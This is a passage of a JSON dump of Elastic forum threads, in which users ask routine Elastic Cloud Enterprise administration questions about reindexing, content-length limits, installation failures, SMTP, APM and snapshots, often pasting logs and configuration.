    "body": "Hi. I am using ECE and i am trying to reindex from an ES which is on kubernetes. I can access ES that is on Kube but when i try to reindex i get the following error: [localhost:9200] not whitelisted in reindex.remote.whitelist. I know that i have to add this option but i don;t have an yml fle configuration. Does anyone encounter this issue? Thanks!",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "0f9934ae-6691-4484-b45a-308e8b1d3576",
    "url": "https://discuss.elastic.co/t/how-does-ece-limit-disk-iops-for-es-node/174899",
    "title": "How does ece limit disk iops for es node?",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "rockybean",
    "date": "April 2, 2019, 2:10am April 2, 2019, 4:51pm April 16, 2019, 5:06pm",
    "body": "Hi, As we know, docker provides capability to limit disk iops by using 'blkio-weight' parameter. I notice ece set different 'blkio-weight' for different size es node. What is the strategy behind this? Thanks!",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "f19e69dd-a144-4130-a554-320d97beed5c",
    "url": "https://discuss.elastic.co/t/how-to-update-http-max-content-length-in-elastic-cloud-cluster/173577",
    "title": "How to update http.max_content_length in elastic cloud cluster",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "Satendrakumar",
    "date": "March 23, 2019, 4:53am March 23, 2019, 7:34am April 1, 2019, 2:51pm April 15, 2019, 2:52pm",
    "body": "I am using an elastic cloud cluster. getting error: Job aborted due to stage failure: Task 1782 in stage 1.0 failed 4 times, most recent failure: Lost task 1782.3 in stage 1.0 (TID 2191, 10.193.89.157, executor 6): org.apache.spark.util.TaskCompletionListenerException: [PUT] on [data_the_284_ingest/my_data/_bulk] failed; server[...] returned [413|Request Entity Too Large:] at org.apache.spark.TaskContextImpl.invokeListeners(TaskContextImpl.scala:153) at org.apache.spark.TaskContextImpl.markTaskCompleted(TaskContextImpl.scala:131) at org.apache.spark.scheduler.Task.run(Task.scala:128) at org.apache.spark.executor.Executor$TaskRunner.run(Executor.scala:384) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at java.lang.Thread.run(Thread.java:748) is any way to update setting http.max_content_length ?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "15264ef3-6eda-40fb-837d-687921dab2a2",
    "url": "https://discuss.elastic.co/t/elastic-cloud-enterprise/171098",
    "title": "Elastic cloud enterprise",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "eagle_eye",
    "date": "March 6, 2019, 11:35am March 6, 2019, 2:56pm March 7, 2019, 5:10pm March 7, 2019, 6:23pm March 8, 2019, 6:16pm March 15, 2019, 2:27pm March 25, 2019, 9:25am March 25, 2019, 2:44pm March 25, 2019, 2:46pm March 27, 2019, 1:23pm March 27, 2019, 2:15pm March 27, 2019, 4:42pm April 10, 2019, 4:42pm",
    "body": "I am new to Elastic Cloud enterprise, I have succesfully installed elastic cloud enterprise on centos machines, but when i restarted the machine, i am trying to access the UI and i am unable to access it, hence i went a head with installation and got the below error. Is there a way to come out of this issues after the reboot Verifying Prerequisites -- Checking runner container does not exist... FAILED Found runner container frc-runners-runner with ID ceea178915cd200f6e60077824a178bad33121c4ee509dbd77cbb3031f653f8c. This may indicate a preexisting install Checking host storage root volume path is not root... PASSED Checking host storage path is accessible... PASSED Checking host storage path contents matches whitelist... FAILED The following non-whitelisted files or directories exist within the host storage path: 10.160.0.4 Remove the files or directories if you are certain they can be deleted safely, or specify a new location with the --host-storage-path parameter, and try again. Checking Docker version... PASSED Checking Docker file system... PASSED Checking Docker storage driver... PASSED The installation with overlay2 can proceed; however, we recommend using overlay Checking whether 'setuser' works inside a Docker container... PASSED Checking runner ip connectivity... PASSED Checking OS IPv4 IP forward setting... PASSED Checking OS max map count setting... PASSED Checking OS kernel version... PASSED OS kernel version is 3.10.0-957.5.1.el7.x86_64 but we recommend 4.4. Checking minimum required memory... PASSED Checking OS kernel cgroup.memory... PASSED OS setting 'cgroup.memory' should be set to cgroup.memory=nokmem Checking OS minimum ephemeral port... PASSED Checking OS max open file descriptors per process... PASSED Checking OS max open file descriptors system-wide... PASSED Checking OS file system and Docker storage driver compatibility... PASSED Checking OS file system storage driver permissions... PASSED Errors have caused Elastic Cloud Enterprise installation to fail Some of the prerequisites failed: [runner container does not exist, host storage path contents matches whitelist], please fix before continuing",
    "website_area": "discuss",
    "replies": 13
  },
  {
    "id": "87ce05bb-49a2-4341-964c-50959621cb0d",
    "url": "https://discuss.elastic.co/t/ece-resthighlevelclient-configuration/173370",
    "title": "ECE & RestHighLevelClient Configuration",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "kiran_reddy1",
    "date": "March 21, 2019, 5:52pm March 21, 2019, 7:14pm March 21, 2019, 7:18pm March 21, 2019, 10:19pm April 4, 2019, 10:19pm",
    "body": "Hi Team, Trying to connect to ECE on premise cluster through Rest client. https://:{hostname}/cluster/{clusterid} . There are three nodes in the cluster and can scale. Trying to connect to cluster with out mentioning node selector or all the http ip:port addresses of nodes. cluster can scale to more nodes and requires a code change if it happens . is there a way to achieve this ? local docker image for localhost:9200 works just fine. Thanks",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "76af30d2-6a73-41d0-a34f-5d47566228a2",
    "url": "https://discuss.elastic.co/t/ece-2-1-0-shard-based-allocations-and-2-0-1/173225",
    "title": "ECE 2.1.0 Shard based allocations and 2.0.1",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "Randy-312",
    "date": "March 20, 2019, 9:16pm March 20, 2019, 9:33pm March 20, 2019, 10:43pm March 21, 2019, 1:10pm April 4, 2019, 1:10pm",
    "body": "In the ECE 210 release notes, it says Disk-based shard allocation settings are now enabled by default. These settings affect only newly created clusters. Is this available in 201, as an ECE feature as well? The 'by default' seems to indicate we can use it. If anyone can point me to the notes for it, I'd appreciate it.",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "8f36c27f-5547-4309-9d1c-2417e2de3cca",
    "url": "https://discuss.elastic.co/t/what-is-the-impact-of-stop-routing/173237",
    "title": "What is the impact of Stop Routing",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "Randy-312",
    "date": "March 21, 2019, 1:10am March 21, 2019, 1:06pm April 4, 2019, 1:06pm",
    "body": "What is the impact of the Stop Routing button in ECE on a) Shards being actively written to? Specifically, will a new shard be created on another node to takeover new traffic? b) Ability to query the old data on that shard. Or will this simply kick the cluster into a yellow state and Elastic will start to flip Replicas to primaries and make new replicas? Which would be similar to the Shard Allocation Filtering feature of ElasticSearch",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "19fb2d50-9705-475b-b958-fbf2b1e6127c",
    "url": "https://discuss.elastic.co/t/incorrect-cloudid-port-ignored-bug/173195",
    "title": "Incorrect CloudID - Port ignored // Bug?",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "infomaniac",
    "date": "March 20, 2019, 5:17pm March 20, 2019, 5:58pm March 20, 2019, 6:01pm March 21, 2019, 11:58am April 4, 2019, 11:58am",
    "body": "I have noticed the CloudID is not showing correctly (at least in the UI). Elasticsearch Endpoint URL: https://c5d47b9145994b8faebf510cebe7e3dc.elastic.hs.coop.ch:9243 Kibana Endpoint URL: https://778494e02130436c8d517a97e191f73a.elastic.hs.coop.ch:9243 Example CloudID: TestCluster:ZWxhc3RpYy5ocy5jb29wLmNoJGM1ZDQ3YjkxNDU5OTRiOGZhZWJmNTEwY2ViZTdlM2RjJDc3ODQ5NGUwMjEzMDQzNmM4ZDUxN2E5N2UxOTFmNzNh This decodes (base64) to elastic.hs.coop.ch$c5d47b9145994b8faebf510cebe7e3dc$778494e02130436c8d517a97e191f73a which is host$elasticsearchID$kibanaID If you use this CloudID in Beats or Logstash, it will fail because it cannot connect to https://c5d47b9145994b8faebf510cebe7e3dc.elastic.hs.coop.ch (without port 9243). I assume this is a bug?",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "cc4fcc76-4b42-47a2-a9ef-04be20df4874",
    "url": "https://discuss.elastic.co/t/ece-and-shard-size-adjustments-on-cluster-re-size-events/173224",
    "title": "ECE and Shard Size adjustments on Cluster Re-Size events",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "Randy-312",
    "date": "March 20, 2019, 9:12pm March 20, 2019, 9:31pm March 20, 2019, 10:37pm April 3, 2019, 10:37pm",
    "body": "Has anyone addressed Auto-Scaling the Shards per index, currently via templates, when ECE expands the cluster's nodes ? Today, we have 24 Data Nodes in our non-ECE based cluster. Via our Templates, we have set Per index, 11 Primary and 1 Replica shards per index, (so totaling 22) and The total_shards_per_node set to 1 in the templates, so that we don’t get a busy node w/ multiple shards on it. This allows us to take 2 nodes offline (or to have hit the high/low water marks) without having an impact. The ECE ‘challenge’ is to be able to increase the number of shards per index as we expand the nodes. While we are considering how Shard Size limitations coming will help with this, we could still end up with a full node or more likely a Busy node when we have everything going to a single node.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "be667b3b-99d0-4de8-89a0-1d650aebae02",
    "url": "https://discuss.elastic.co/t/jfrog-artifactory-for-ece-docker-repository/169734",
    "title": "JFrog Artifactory for ECE Docker repository",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "Randy-312",
    "date": "February 24, 2019, 4:14pm February 24, 2019, 4:36pm February 24, 2019, 7:34pm February 25, 2019, 8:12am March 10, 2019, 5:23pm March 20, 2019, 5:00pm April 3, 2019, 5:00pm",
    "body": "Has anyone connected ECE to use Artifactory as the docker repo? If so, I would welcome hearing of any challenges that you encountered in doing so. Especially around security / authentication if you were required to put that in place for Artifactory.",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "53ab0292-0a3e-4e66-9223-68738957ce27",
    "url": "https://discuss.elastic.co/t/no-processor-type-exists-with-name-geoip/173174",
    "title": "No processor type exists with name [geoip]",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "Tim_Rice",
    "date": "March 20, 2019, 2:54pm March 20, 2019, 3:21pm April 3, 2019, 3:21pm",
    "body": "Hello, I am looking at elastic.co hosted services. I am trying to leverage geoip for an IP address, but I am not having any luck. When I try to add geoip to an existing pipeline, I receive a \"No processor type exists with name [geoip]\" Error. I have added the ingest-geoip plugin. Here is what I am trying to apply: PUT _ingest/pipeline/mitresplit { \"description\": \"splits technique_name and technique_id\", \"processors\": [ { \"kv\": { \"field\": \"event_data.RuleName\", \"field_split\": \",\", \"value_split\": \"=\" }, \"geoip\": { \"field\": \"DestinationIp\", \"target_field\": \"masq-geo\" } } ] }",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "194cab69-c6b8-4288-aa4a-bc4531a3ce4f",
    "url": "https://discuss.elastic.co/t/persistent-node-names/173153",
    "title": "Persistent node names",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "osykora",
    "date": "March 20, 2019, 1:37pm March 20, 2019, 1:57pm April 3, 2019, 1:57pm",
    "body": "Hi, a node name looks like \"instance-0000000001\" and is incremented on every cluster update. This is fine until one takes a look into Kibana Monitoring tab and finds out that a new node got created there as well and that the node's historical data can be found under the old node's name only. Isn't there a way to instruct ECE not to rename nodes on update or to use an alias instead so that the Monitoring tab shows full nodes history? Nodes.png1729×718 51.7 KB",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "4e098bfc-cb9b-4930-a1d0-e46b2616491a",
    "url": "https://discuss.elastic.co/t/can-ece-be-installed-on-lv-with-2-partitions/171851",
    "title": "Can ECE be installed on LV with 2 partitions?",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "Ong",
    "date": "March 12, 2019, 4:52am March 15, 2019, 2:28pm March 29, 2019, 2:28pm",
    "body": "I have a VM which consists of a Logical Volume consisting of 2 separate partitions on a single disk. Can ECE be installed on this LV which consists of 2 partitions on a single disk? Or should ECE be installed on a single partition?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "e8863a4a-1266-4677-8ff4-950a09ee192d",
    "url": "https://discuss.elastic.co/t/preparing-the-rhel-environment-how-to-set-the-fs-may-detach-mounts/171926",
    "title": "Preparing the RHEL Environment: How to set the fs.may_detach_mounts?",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "Ong",
    "date": "March 12, 2019, 10:47am March 13, 2019, 8:50am March 27, 2019, 8:50am",
    "body": "I am preparing the RHEL environment for installing ECE based on the documentation at https://www.elastic.co/guide/en/cloud-enterprise/2.0/ece-configure-hosts-rhel-centos.html I am stuck at the step on enabling fs.may_detach_mounts. I ran the \"cat /proc/sys/fs/may_detach_mounts\" and the system returned \"cat: /proc/sys/fs/may_detach_mounts: No such file or directory\". Then I added the line \"fs.may_detach_mounts=1\" into /etc/sysctl.conf. After that, I ran sysctl -p and /proc/sys/fs/may_detach_mounts but got the same no such file or directory message. I tried to create the \"may_detach_mounts\" directory and the system returned \"mkdir: Cannot create directory '/proc/sys/fs/may_detach_mounts: No such file or directory\". How do I enable this setting on RHEL?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "94828551-0bac-4e33-ac38-184cfeb35291",
    "url": "https://discuss.elastic.co/t/canvas-on-aws/171399",
    "title": "Canvas on AWS",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "",
    "date": "March 7, 2019, 11:30pm March 8, 2019, 11:21am March 8, 2019, 3:43pm March 10, 2019, 3:14pm March 10, 2019, 3:46pm March 11, 2019, 3:40pm March 11, 2019, 7:48pm March 13, 2019, 4:49am March 13, 2019, 5:05am March 27, 2019, 5:05am",
    "body": "",
    "website_area": "discuss",
    "replies": 10
  },
  {
    "id": "493e6517-c51e-4c4b-b85f-407228a06e4e",
    "url": "https://discuss.elastic.co/t/x-pack-monitoring-logstash/171127",
    "title": "X-pack monitoring logstash",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "Costi",
    "date": "March 6, 2019, 2:04pm March 6, 2019, 2:44pm March 6, 2019, 2:52pm March 6, 2019, 3:01pm March 20, 2019, 3:05pm",
    "body": "Hi! I am using elastic cloud enterprise and i configured logstash.yml to use xpack monitoring. After i run logstash.conf to get some data into ES, i cannot see in the Monitoring tab what x-pack has monitored for logstash. I can only see for ES, kibana and APM. I also run GET /_xpack/security/user/ and GET /_xpack/ and i have x-pack enabled for logstash. Does anyone have any ideea? Thanks!",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "c3613f4f-7807-4005-8261-d0793304cef2",
    "url": "https://discuss.elastic.co/t/apm-kibana-storage-allocation/171109",
    "title": "APM / Kibana Storage Allocation",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "JamesNotJamez",
    "date": "March 6, 2019, 12:29pm March 6, 2019, 2:53pm March 20, 2019, 2:53pm",
    "body": "Hi, I'm trying to work out the storage allocation of APM and Kibana instances, but this information isn't returned in any of the basic API calls (as far as I can see). I can work it out by getting the storage_multiplier field from the instance configuration API, but this seems a bit long winded. Is there a quicker way I'm missing? Thanks, James",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "a2236121-0f33-4e4c-a6f8-26a0283923bf",
    "url": "https://discuss.elastic.co/t/can-we-limit-es-master-instance-disk-size-to-specified-number-no-matter-how-much-its-memory-size-is/170640",
    "title": "Can we limit es master instance disk size to specified number no matter how much its memory size is?",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "rockybean",
    "date": "March 3, 2019, 3:24pm March 3, 2019, 4:00pm March 4, 2019, 1:39am March 4, 2019, 1:46am March 4, 2019, 8:27am March 4, 2019, 10:21am March 4, 2019, 10:22am March 4, 2019, 10:47am March 4, 2019, 12:51pm March 4, 2019, 1:58pm March 4, 2019, 2:15pm March 5, 2019, 10:10am March 5, 2019, 10:26am March 5, 2019, 12:25pm March 5, 2019, 8:48pm March 6, 2019, 2:30am March 6, 2019, 10:58am March 20, 2019, 10:58am",
    "body": "Hi, In ECE template configuration page, we can create dedicated master type instance. For sizing part, we can set memory-to-disk ratio. If we set a high ratio like 32, ece will allocate 32GB disk per 1GB memory. So if user choose 4GB for dedicated master , ece will allocate 128GB disk for this instance. As we know, master node mainly uses memory and doesn't require high disk size. 20GB should be enough for one master node no matter how much its memory size is. 128GB is too much and may be a waste. So my question is how can we limit master type instance to specified disk size like 20GB. Any tips? thanks!",
    "website_area": "discuss",
    "replies": 18
  },
  {
    "id": "c3915729-d0ed-4f61-ae3c-b995120f8f84",
    "url": "https://discuss.elastic.co/t/apm-servers-hangs-on-rolling-configuration-change-after-a-change-in-elastic/170985",
    "title": "APM Servers hangs on rolling configuration change after a change in elastic",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "gmazza",
    "date": "March 5, 2019, 8:19pm March 5, 2019, 8:37pm March 5, 2019, 8:37pm March 5, 2019, 8:38pm March 5, 2019, 8:52pm March 5, 2019, 8:41pm March 5, 2019, 8:54pm March 5, 2019, 9:43pm March 19, 2019, 9:43pm",
    "body": "I had applied a Rolling configuration change to my installation. All Kibana and Elasticsearch nodes came back without a problem but the APM Servers shows as pending configuration. Also it is showing this alert APM health issue: Instances are unhealthy When I review the details for APM i notice on the APM yaml \"system_settings\": { \"elasticsearch_url\": \"http://a1.containerhost:9244\", \"elasticsearch_username\": \"cloud-internal-apm-server\", \"kibana_url\": \"http://containerhost:9244\", \"elasticsearch_password\": \"password\", \"secret_token\": \"-\" } Please advice should that secret_token entry have a value? i had replaced the specific values for this post but each entry shows values except secret_token which only shows a dash (-) How I recover from this? Can i stop the APM server configuration and start fresh? i really was not doing anything yet with APM servers but I would like APM servers to be available to use. I can do the APM server deployment again if necessary but not sure how to stop this rolling upgrade for APM and delete the remaining APM nodes ONLY and install new ones without affecting the existing elasticsearch and kibana nodes. Please advise.",
    "website_area": "discuss",
    "replies": 9
  },
  {
    "id": "9898fbdc-69b9-4f28-a4eb-b5e2204800dc",
    "url": "https://discuss.elastic.co/t/how-to-connect-ece-installation-with-local-smtp-server/170970",
    "title": "How to Connect ECE installation with local SMTP Server",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "gmazza",
    "date": "March 5, 2019, 6:53pm March 5, 2019, 6:59pm March 5, 2019, 8:04pm March 19, 2019, 8:04pm",
    "body": "I am trying to connect ECE to our local SMTP server so Elastic can send emails I added the following configuration to the elastic deployment xpack.notification.email.account: exchange_account: profile: outlook email_defaults: from: ece-tst@noreply.org smtp: auth: false starttls.enable: false host: smtpserver.chsys.org port: 25 user: ece-tst@noreply.org Well It does not send emails i get these errors on the logs [2019-03-05T14:27:09,454][ERROR][org.elasticsearch.xpack.watcher.actions.email.ExecutableEmailAction] [instance-0000000024] failed to execute action [_inlined_/email_1] javax.mail.MessagingException: failed to send email with subject [Watch [HL7-Suspended] has exceeded the threshold] via account [work] at org.elasticsearch.xpack.watcher.notification.email.EmailService.send(EmailService.java:154) ~[?:?] at org.elasticsearch.xpack.watcher.notification.email.EmailService.send(EmailService.java:146) ~[?:?] at org.elasticsearch.xpack.watcher.actions.email.ExecutableEmailAction.execute(ExecutableEmailAction.java:72) ~[?:?] at org.elasticsearch.xpack.core.watcher.actions.ActionWrapper.execute(ActionWrapper.java:144) [x-pack-core-6.6.1.jar:6.6.1] at org.elasticsearch.xpack.watcher.execution.ExecutionService.executeInner(ExecutionService.java:454) [x-pack-watcher-6.6.1.jar:6.6.1] at org.elasticsearch.xpack.watcher.execution.ExecutionService.execute(ExecutionService.java:294) [x-pack-watcher-6.6.1.jar:6.6.1] at org.elasticsearch.xpack.watcher.transport.actions.execute.TransportExecuteWatchAction$1.doRun(TransportExecuteWatchAction.java:154) [x-pack-watcher-6.6.1.jar:6.6.1] at org.elasticsearch.common.util.concurrent.AbstractRunnable.run(AbstractRunnable.java:37) [elasticsearch-6.6.1.jar:6.6.1] at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511) [?:1.8.0_144] at java.util.concurrent.FutureTask.run(FutureTask.java:266) [?:1.8.0_144] at org.elasticsearch.common.util.concurrent.ThreadContext$ContextPreservingRunnable.run(ThreadContext.java:660) [elasticsearch-6.6.1.jar:6.6.1] at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) [?:1.8.0_144] at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) [?:1.8.0_144] at java.lang.Thread.run(Thread.java:748) [?:1.8.0_144] Caused by: com.sun.mail.util.MailConnectException: Couldn't connect to host, port: dockerhost, 10025; timeout 120000 at com.sun.mail.smtp.SMTPTransport.openServer(SMTPTransport.java:2209) ~[?:?] at com.sun.mail.smtp.SMTPTransport.protocolConnect(SMTPTransport.java:740) ~[?:?] at javax.mail.Service.connect(Service.java:366) ~[?:?] at org.elasticsearch.xpack.watcher.notification.email.Account.lambda$executeConnect$2(Account.java:159) ~[?:?] at java.security.AccessController.doPrivileged(Native Method) ~[?:1.8.0_144] at org.elasticsearch.xpack.watcher.notification.email.Account.executeConnect(Account.java:158) ~[?:?] at org.elasticsearch.xpack.watcher.notification.email.Account.send(Account.java:117) ~[?:?] at org.elasticsearch.xpack.watcher.notification.email.EmailService.send(EmailService.java:152) ~[?:?] ... 13 more Caused by: java.net.ConnectException: Connection refused (Connection refused) at java.net.PlainSocketImpl.socketConnect(Native Method) ~[?:1.8.0_144] at java.net.AbstractPlainSocketImpl.doConnect(AbstractPlainSocketImpl.java:350) ~[?:1.8.0_144] at java.net.AbstractPlainSocketImpl.connectToAddress(AbstractPlainSocketImpl.java:206) ~[?:1.8.0_144] at java.net.AbstractPlainSocketImpl.connect(AbstractPlainSocketImpl.java:188) ~[?:1.8.0_144] at java.net.SocksSocketImpl.connect(SocksSocketImpl.java:392) ~[?:1.8.0_144] at java.net.Socket.connect(Socket.java:589) ~[?:1.8.0_144] at com.sun.mail.util.WriteTimeoutSocket.connect(WriteTimeoutSocket.java:115) ~[?:?] at com.sun.mail.util.SocketFetcher.createSocket(SocketFetcher.java:357) ~[?:?] at com.sun.mail.util.SocketFetcher.getSocket(SocketFetcher.java:238) ~[?:?] at com.sun.mail.smtp.SMTPTransport.openServer(SMTPTransport.java:2175) ~[?:?] at com.sun.mail.smtp.SMTPTransport.protocolConnect(SMTPTransport.java:740) ~[?:?] at javax.mail.Service.connect(Service.java:366) ~[?:?] at org.elasticsearch.xpack.watcher.notification.email.Account.lambda$executeConnect$2(Account.java:159) ~[?:?] at java.security.AccessController.doPrivileged(Native Method) ~[?:1.8.0_144] at org.elasticsearch.xpack.watcher.notification.email.Account.executeConnect(Account.java:158) ~[?:?] at org.elasticsearch.xpack.watcher.notification.email.Account.send(Account.java:117) ~[?:?] at org.elasticsearch.xpack.watcher.notification.email.EmailService.send(EmailService.java:152) ~[?:?] ... 13 more",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "ec2022e8-d696-4757-bc92-24804dee0bcc",
    "url": "https://discuss.elastic.co/t/http-max-content-length-not-enforced-properly/170919",
    "title": "Http_max_content_length not enforced properly",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "JamesNotJamez",
    "date": "March 5, 2019, 1:59pm March 5, 2019, 6:23pm March 19, 2019, 6:23pm",
    "body": "Hi, We have the following configuration variable set in a deployment: http.max_content_length: \"400mb\" but when indexing a document are seeing the error Caused by: org.elasticsearch.client.ResponseException: POST https://d72ceeb814c740869fafde4e6a89c6d4.dev-eu.elastic.nomura.com:9243/_bulk: HTTP/1.1 413 Request Entity Too Large Request Content-Length 242874783 exceeds the configured limit of 209715200 Looks like the deployment has a configured limit of 200mb despite what is set in the yaml. Wondering if the setting is not being enforced properly? Additionally is there a way to check the http_max_content_length from within the deployment? Haven't found anything online so far. Thanks, James",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "78a2f62d-c7c3-4b84-bba8-29328bec4d71",
    "url": "https://discuss.elastic.co/t/how-to-see-full-logs/170514",
    "title": "How to see full logs",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "osykora",
    "date": "March 1, 2019, 2:36pm March 1, 2019, 2:38pm March 1, 2019, 2:52pm March 1, 2019, 2:54pm March 1, 2019, 3:02pm March 1, 2019, 3:03pm March 15, 2019, 3:03pm",
    "body": "Hello, when I check service logs in Kibana, I can see some errors with a truncated stack trace. I wonder whether there's a place where I could see those errors with full stack trace so that I can fix the issues easily. For example, there's this record in \"service-logs-2019.03.01\": [2019-03-01 14:01:58,147][WARN ][no.found.runner.allocation.elasticsearch.snapshot.Snapshotter] Unexpected http response received during snapshot iteration: [Unable to ensure repository [found-snapshots]: [500 Internal Server Error]]: [HttpResponse(500 Internal Server Error,HttpEntity(application/json; charset=UTF-8,{\"error\":{\"root_cause\":[{\"type\":\"repository_verification_exception\",\"reason\":\"[found-snapshots] path [snapshots/eacde3e30c2c40baab9cf7c7a429ba6a] is not accessible on master node\"}],\"type\":\"repository_verification_exception\",\"reason\":\"[found-snapshots] path [snapshots/eacde3e30c2c40baab9cf7c7a429ba6a] is not accessible on master node\",\"caused_by\":{\"type\":\"i_o_exception\",\"reason\":\"Unable to upload object [snapshots/eacde3e30c2c40baab9cf7c7a429ba6a/tests-EkjxNmiASziJ8gnnMZHUYA/master.dat] using a ...) ending with \"using a ...)\". Can I do anything to view the full stack trace (to configure something, catching it in the related docker container, etc.)?",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "1fdb2cbe-c67b-48c0-8bc3-a06c4a417992",
    "url": "https://discuss.elastic.co/t/change-cluster-name/170371",
    "title": "Change cluster name",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "osykora",
    "date": "February 28, 2019, 3:17pm February 28, 2019, 3:56pm February 28, 2019, 4:01pm March 14, 2019, 4:07pm",
    "body": "Is there a way to change a cluster name or a node name in ECE? The thing is that the autogenerated name is being logged into monitoring cluster and having many ES clusters with these guid names leads to confusion when working with Kibana Monitoring tab since it's hard to identify which cluster the id belongs to. It would be better to use a human-friendly name instead. We created an ingest pipeline to add the real cluster name to each and every logged record so that at least our dashboards show meaningful name, but I'd prefer an out of box solution as this one might have some serious performance implications. Thanks",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "99fca79e-ab60-4baa-b95f-f7013c59f936",
    "url": "https://discuss.elastic.co/t/custom-monitoring-cluster-for-ece-metricbeat/170343",
    "title": "Custom monitoring cluster for ECE Metricbeat",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "osykora",
    "date": "February 28, 2019, 12:39pm February 28, 2019, 1:41pm March 14, 2019, 1:41pm",
    "body": "Hello, ECE ships with Metricbeat to monitor hardware usage on ECE nodes. However, it sends data to the default logging-and-metrics monitoring cluster only. I have another separate monitoring cluster that I use for monitoring ECE clusters by enabling monitoring feature in deployments. I'd like to achieve a state that I have a single monitoring cluster for both ECE metricbeats and clusters monitoring data so that I have only one place to look at. Is there a way to configure ECE to send metricbeats data to my cluster or do I have to install separate metricbeats on ECE servers and configure accordingly? Thank you in advance.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "13fce9e4-7fa3-47e3-8274-e02560ef94e7",
    "url": "https://discuss.elastic.co/t/ece-weird-full-restart-deployment/169937",
    "title": "ECE Weird Full Restart Deployment",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "rockybean",
    "date": "February 26, 2019, 4:30am February 26, 2019, 4:37am February 26, 2019, 4:51am February 26, 2019, 2:21pm March 12, 2019, 2:21pm",
    "body": "Hi, I met full restart deployment case when I scaled 3 nodes to 6 nodes. This is very weird and scared because a full restart deployment means cluster is not available for user during this time. image.jpg2352×680 134 KB During this plan, we keep writing documents to cluster. And I notice one node has heap pressure like below. image.jpg776×662 78.4 KB So why ece do a full restart deployment even if I choose a rolling strategy. My plan details is as below: { \"tiebreaker_topology\": { \"memory_per_node\": 1024 }, \"elasticsearch\": { \"version\": \"5.6.14\", \"system_settings\": { \"use_disk_threshold\": true } }, \"transient\": { \"strategy\": { \"rolling\": { \"group_by\": \"__all__\" } }, \"plan_configuration\": { \"preferred_allocators\": [], \"max_snapshot_attempts\": 3, \"move_allocators\": [], \"skip_snapshot\": true, \"move_instances\": [], \"skip_post_upgrade_steps\": false, \"cluster_reboot\": \"forced\", \"extended_maintenance\": false, \"skip_upgrade_checker\": false, \"override_failsafe\": false, \"skip_data_migration\": false, \"calm_wait_time\": 5, \"reallocate_instances\": false, \"timeout\": 4096, \"move_only\": false } }, \"cluster_topology\": [ { \"memory_per_node\": 1024, \"node_type\": { \"master\": true, \"data\": true, \"ingest\": true, \"ml\": false }, \"instance_configuration_id\": \"c3fd8f77dffe421897f870339dc13015\", \"elasticsearch\": { \"system_settings\": { \"enable_close_index\": false, \"use_disk_threshold\": true, \"monitoring_collection_interval\": -1, \"monitoring_history_duration\": \"7d\", \"destructive_requires_name\": false, \"reindex_whitelist\": [], \"auto_create_index\": true, \"watcher_trigger_engine\": \"scheduler\", \"scripting\": { \"inline\": { \"enabled\": true, \"sandbox_mode\": true }, \"expressions_enabled\": true, \"stored\": { \"enabled\": true, \"sandbox_mode\": true }, \"file\": { \"enabled\": true, \"sandbox_mode\": true }, \"mustache_enabled\": true, \"painless_enabled\": true }, \"http\": { \"compression\": true, \"cors_enabled\": false, \"cors_max_age\": 1728000, \"cors_allow_credentials\": false } }, \"enabled_built_in_plugins\": [], \"user_plugins\": [], \"user_bundles\": [] }, \"zone_count\": 3, \"node_count_per_zone\": 2 } ], \"deployment_template\": { \"id\": \"4a17673d984b462ba8a2cbb8875bf4d9\" } }",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "a2c92a78-d6e0-4c11-810b-c7a32499df2d",
    "url": "https://discuss.elastic.co/t/how-to-remove-snapshot-error-tips-on-ui/169416",
    "title": "How to remove snapshot error tips on UI?",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "rockybean",
